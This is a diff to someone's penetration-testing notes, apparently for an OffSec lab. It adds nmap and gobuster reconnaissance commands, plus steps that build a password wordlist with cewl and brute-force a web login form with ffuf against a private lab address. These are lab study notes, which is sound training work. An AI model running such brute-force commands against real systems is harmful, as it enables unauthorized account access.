@@ -2,7 +2,7 @@
 
 #### **Nmap**
 ```
-sudo nmap -O -Pn 192.168.164.121
+sudo nmap -O -Pn <IP>
 
 sudo nmap -p- -sV -sS -Pn -A <IP>
 ```
@@ -25,4 +25,13 @@ gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt
 
 ```
 gobuster dir -u <IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+```
+
+### Use Custom word list generator to bruteforce password
+```
+cewl -d 2 -m 5 -w custom_passwords_test.txt http://<IP>
+```
+
+```
+ffuf -w /home/amrityam/kali/offsec/playground/custom_passwords_test.txt -u http://192.168.228.121/dev/index.php -X POST -d 'username=bob&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
